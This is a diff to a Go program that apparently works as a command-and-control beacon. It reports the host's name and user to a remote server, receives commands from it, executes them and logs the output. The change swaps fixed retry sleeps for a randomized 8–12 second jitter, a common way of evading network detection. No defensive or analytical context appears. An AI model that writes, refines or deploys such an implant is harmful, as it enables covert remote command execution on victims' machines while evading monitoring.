@@ -12,6 +12,7 @@ import (
 	"runtime"
 	"strings"
 	"time"
+	"math/rand"
 )
 
 var (
@@ -27,23 +28,24 @@ func main() {
 	}
 	
 	for {
+		n := 8 + rand.Intn(5)
 		hostname, err := os.Hostname()
 		if err != nil {
 		log.Printf("failed to get hostname: %v", err)
-		time.Sleep(10 * time.Second)
+		time.Sleep(time.Duration(n) * time.Second)
 		continue
 		}
 		currentUser, err := user.Current()
 		if err != nil {
 			log.Printf("failed to get current user: %v", err)
-			time.Sleep(10 * time.Second)
+			time.Sleep(time.Duration(n) * time.Second)
 			continue
 		}
 
 		conn, err := net.Dial("tcp", ServerAddr)
 		if err != nil {
 			log.Printf("failed to connect to server: %v", err)
-			time.Sleep(10 * time.Second)
+			time.Sleep(time.Duration(n) * time.Second)
 			continue
 		}
 
@@ -51,7 +53,7 @@ func main() {
 		_, err = conn.Write([]byte(message))
 		if err != nil {
 			log.Printf("failed to send message: %v", err)
-			time.Sleep(10 * time.Second)
+			time.Sleep(time.Duration(n) * time.Second)
 			continue
 		}
 
@@ -59,7 +61,7 @@ func main() {
 		response, err := reader.ReadString('\n')
 		if err != nil {
 			log.Printf("failed to read response: %v", err)
-			time.Sleep(10 * time.Second)
+			time.Sleep(time.Duration(n) * time.Second)
 			continue
 		}
 		if strings.HasPrefix(response, "ACK:") {
@@ -74,7 +76,7 @@ func main() {
 			output, err := cmd.CombinedOutput()
 			if err != nil {
 				log.Printf("failed to execute command: %v", err)
-				time.Sleep(10 * time.Second)
+				time.Sleep(time.Duration(n) * time.Second)
 				continue
 			}
 			log.Printf("command output: %s", output)
@@ -83,6 +85,6 @@ func main() {
 
 		}
 		conn.Close()
-		time.Sleep(10 * time.Second)
+		time.Sleep(time.Duration(n) * time.Second)
 	}
 }
